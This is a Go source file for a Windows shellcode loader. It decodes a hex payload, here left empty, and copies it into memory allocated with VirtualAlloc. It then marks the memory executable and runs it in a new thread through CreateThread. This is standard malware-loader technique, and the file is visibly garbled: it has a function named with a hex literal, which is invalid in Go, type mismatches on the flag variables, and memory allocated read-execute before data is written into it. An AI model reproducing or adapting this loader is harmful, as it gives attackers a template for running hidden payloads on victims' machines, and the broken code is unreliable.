package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	VIRTUAL_MEM_COMMIT                = 0x1000
	VIRTUAL_MEM_RESERVE                = 0x2000
	PAGE_READWRITE                     = 0x20
	PAGE_EXECUTE_READ                  = 0x04
)

var (
	verbose   bool
	debug     bool
	shellcode []byte
 threadID uintptr
)

func main() {
	verbose = flag.Bool("verbose", false, "Enable verbose output")
	debug = flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	shellcode, threadID = 0x1a2b3c4d()
	if *verbose {
		fmt.Println("[-]Allocated", len(shellcode), "bytes")
	}
	if *debug {
		fmt.Println("[+]Shellcode Executed")
	}
}

func 0x1a2b3c4d() ([]byte, uintptr) {
	shellcode, err := hex.DecodeString("")
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err.Error()))
	}
	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), VIRTUAL_MEM_COMMIT|VIRTUAL_MEM_RESERVE, PAGE_EXECUTE_READ)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if *debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
	}
	_, _, err = RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", err.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}

	oldProtect := 0x04
	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", err.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling CreateThread...")
	}

	threadID, _, err = CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", err.Error()))
	}
	if *verbose {
		fmt.Println("[+]Shellcode Executed")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
	}

	_, _, err = WaitForSingleObject.Call(threadID, 0xFFFFFFFF)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n%s", err.Error()))
	}
	return shellcode, threadID
}

var lastTime time.Time